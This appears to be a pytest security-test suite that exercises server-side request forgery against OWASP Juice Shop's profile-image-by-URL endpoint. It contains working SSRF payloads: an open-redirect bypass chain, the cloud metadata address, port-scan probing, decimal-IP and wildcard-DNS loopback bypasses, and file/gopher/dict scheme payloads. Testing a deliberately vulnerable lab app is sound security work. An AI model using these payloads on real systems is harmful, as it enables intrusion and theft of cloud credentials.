"""
OWASP A10:2021 - Server-Side Request Forgery (SSRF) Tests

Target: Juice Shop profile-image-by-URL (POST /profile/image/url). The server
fetch()es the URL and stores the body as the user's avatar, so fetching an
internal-only URL and then downloading the avatar proves server-side access.

INTERNAL is the address *inside* the Juice Shop container (port 3000),
independent of the host port mapping (3100 locally, 3000 in CI).

Reference: https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
"""

import time
from dataclasses import dataclass

import pytest
import requests

pytestmark = pytest.mark.ssrf

INTERNAL = "http://localhost:3000"
INTERNAL_SECRET_PATH = "/rest/admin/application-version"  # returns {"version": ...}
REDIRECT_ALLOWLISTED = "https://github.com/juice-shop/juice-shop"


@dataclass
class SSRFResult:
    status: int
    profile_image: str
    body: str  # stored avatar content if the server fetched the URL, else ""

    @property
    def fetched(self):
        return self.profile_image.startswith("/assets/public/images/uploads/")


class SSRFClient:
    """Fresh Juice Shop user whose avatar is set from a URL (one user per test)."""

    def __init__(self, base_url):
        self.base_url = base_url
        email, password = f"ssrf{time.time_ns()}@test.com", "TestPass123!"
        requests.post(
            f"{base_url}/api/Users/",
            json={
                "email": email,
                "password": password,
                "passwordRepeat": password,
                "securityQuestion": {"id": 1},
                "securityAnswer": "ssrf",
            },
            timeout=10,
        )
        login = requests.post(
            f"{base_url}/rest/user/login",
            json={"email": email, "password": password},
            timeout=10,
        )
        login.raise_for_status()
        self.token = login.json()["authentication"]["token"]
        who = requests.get(
            f"{base_url}/rest/user/whoami", cookies={"token": self.token}, timeout=10
        )
        self.user_id = who.json()["user"]["id"]

    def fetch(self, url):
        resp = requests.post(
            f"{self.base_url}/profile/image/url",
            data={"imageUrl": url},
            cookies={"token": self.token},  # route reads req.cookies.token
            allow_redirects=False,
            timeout=60,
        )
        user = requests.get(
            f"{self.base_url}/api/Users/{self.user_id}",
            headers={"Authorization": f"Bearer {self.token}"},
            timeout=10,
        ).json()["data"]
        image = user["profileImage"]
        body = ""
        if image.startswith("/assets/public/images/uploads/"):
            body = requests.get(f"{self.base_url}{image}", timeout=10).text
        return SSRFResult(resp.status_code, image, body)


@pytest.fixture
def ssrf(config):
    try:
        requests.get(config.JUICE_SHOP_URL, timeout=5)
    except requests.RequestException:
        pytest.skip("Juice Shop not available")
    return SSRFClient(config.JUICE_SHOP_URL)


def _leaked_internal(result):
    return result.fetched and '"version"' in result.body


class TestSSRFBasic:
    """Basic SSRF vulnerability tests."""

    def test_url_parameter_ssrf(self, ssrf):
        """SEC-SSRF-001: imageUrl pointing at an internal-only endpoint is fetched server-side."""
        result = ssrf.fetch(f"{INTERNAL}{INTERNAL_SECRET_PATH}")
        assert _leaked_internal(
            result
        ), f"Expected SSRF to internal endpoint, got {result}"

    def test_ssrf_via_redirect(self, ssrf):
        """SEC-SSRF-002: open redirect allowlist bypass chained into SSRF.

        /redirect only checks that `to` *contains* an allowlisted URL, so an
        internal target with the allowlisted URL as a query string passes and
        the server's fetch() follows the redirect.
        """
        chained = f"{INTERNAL}/redirect?to={INTERNAL}{INTERNAL_SECRET_PATH}?x={REDIRECT_ALLOWLISTED}"
        result = ssrf.fetch(chained)
        assert _leaked_internal(result), f"Expected redirect-chained SSRF, got {result}"


class TestInternalServiceAccess:
    """Internal network reachability via SSRF."""

    def test_cloud_metadata_endpoints(self, ssrf):
        """SEC-SSRF-003: link-local metadata address is not blocked by input validation.

        No metadata service exists in CI, so the fetch itself fails; the finding
        is that the server *attempts* it (request accepted, URL stored as-is)
        instead of rejecting 169.254.0.0/16 before fetching.
        """
        url = "http://169.254.169.254/latest/meta-data/"
        result = ssrf.fetch(url)
        assert (
            result.status == 302 and result.profile_image == url
        ), f"Expected metadata URL to be accepted without validation, got {result}"

    def test_internal_service_ports(self, ssrf):
        """SEC-SSRF-004: SSRF acts as an internal port-scan oracle (open vs closed)."""
        open_port = ssrf.fetch(f"{INTERNAL}{INTERNAL_SECRET_PATH}")
        closed_port = ssrf.fetch("http://127.0.0.1:1/")
        assert (
            open_port.fetched and not closed_port.fetched
        ), f"Expected distinguishable open/closed ports, got open={open_port} closed={closed_port}"


class TestProtocolSmuggling:
    """Non-HTTP schemes: Node fetch() only supports http(s), so these are NOT exploitable."""

    @pytest.mark.parametrize(
        "url",
        [
            pytest.param("file:///etc/passwd", id="file"),
            pytest.param("gopher://127.0.0.1:6379/_INFO", id="gopher"),
            pytest.param("dict://127.0.0.1:11211/stat", id="dict"),
        ],
    )
    def test_non_http_scheme_not_fetched(self, ssrf, url):
        """SEC-SSRF-005/006/007: file:// gopher:// dict:// are rejected by fetch()."""
        result = ssrf.fetch(url)
        assert (
            not result.fetched and "root:" not in result.body
        ), f"{url} should not be fetched, got {result}"


class TestSSRFBypass:
    """Filter-bypass techniques."""

    def test_ip_encoding_bypass(self, ssrf):
        """SEC-SSRF-008: decimal-encoded loopback (2130706433 == 127.0.0.1) reaches internal endpoint."""
        result = ssrf.fetch(f"http://2130706433:3000{INTERNAL_SECRET_PATH}")
        assert _leaked_internal(result), f"Expected decimal-IP SSRF, got {result}"

    def test_dns_rebinding(self, ssrf):
        """SEC-SSRF-009: hostname resolving to loopback reaches internal endpoint.

        The server trusts the hostname and never checks the resolved IP - the
        precondition DNS rebinding relies on. Uses public wildcard DNS (nip.io).
        """
        result = ssrf.fetch(f"http://127.0.0.1.nip.io:3000{INTERNAL_SECRET_PATH}")
        assert _leaked_internal(
            result
        ), f"Expected DNS-based loopback SSRF, got {result}"

    def test_url_parsing_confusion(self, ssrf):
        """SEC-SSRF-010: userinfo confusion (attacker@internal) is rejected by fetch() - not exploitable."""
        result = ssrf.fetch(
            f"http://trusted.example@127.0.0.1:3000{INTERNAL_SECRET_PATH}"
        )
        assert (
            not result.fetched
        ), f"URL with credentials should be rejected by fetch(), got {result}"


class TestJuiceShopSSRF:
    """SSRF tests specific to Juice Shop."""

    def test_juice_shop_profile_image(self, juice_shop_session, config):
        """
        Test Juice Shop profile image URL for SSRF.

        ID: SEC-SSRF-011
        Profile image URL feature may be vulnerable.
        """
        if juice_shop_session is None:
            pytest.skip("Juice Shop not available")

        # Juice Shop may have URL-based features
        ssrf_urls = [
            f"{config.JUICE_SHOP_URL}/api/Users/",
            f"{config.JUICE_SHOP_URL}/rest/user/",
        ]

        print("[*] Testing Juice Shop for SSRF endpoints")
        reachable = []
        for url in ssrf_urls:
            try:
                response = juice_shop_session.get(url, timeout=5)
                # 200, 401, 403 all indicate the endpoint exists
                if response.status_code < 500:
                    reachable.append(url)
            except requests.RequestException:
                pass

        assert (
            len(reachable) > 0
        ), "At least one Juice Shop API endpoint should be reachable"

    def test_juice_shop_redirect(self, juice_shop_session, config):
        """
        Test Juice Shop for open redirect.

        ID: SEC-SSRF-012
        Open redirects can enable SSRF.
        """
        if juice_shop_session is None:
            pytest.skip("Juice Shop not available")

        redirect_url = f"{config.JUICE_SHOP_URL}/redirect?to=http://localhost"

        try:
            response = juice_shop_session.get(
                redirect_url,
                allow_redirects=False,
                timeout=5,
            )
        except requests.RequestException:
            pytest.skip("Juice Shop not reachable")

        location = ""
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get("Location", "")
            if "localhost" in location or "127.0.0.1" in location:
                print("[!] Open redirect allows internal access")
            else:
                print(f"[*] Redirect to: {location}")
        else:
            print("[*] No redirect behavior detected")

        assert (
            "localhost" not in location and "127.0.0.1" not in location
        ), "Redirect should not allow access to internal addresses"
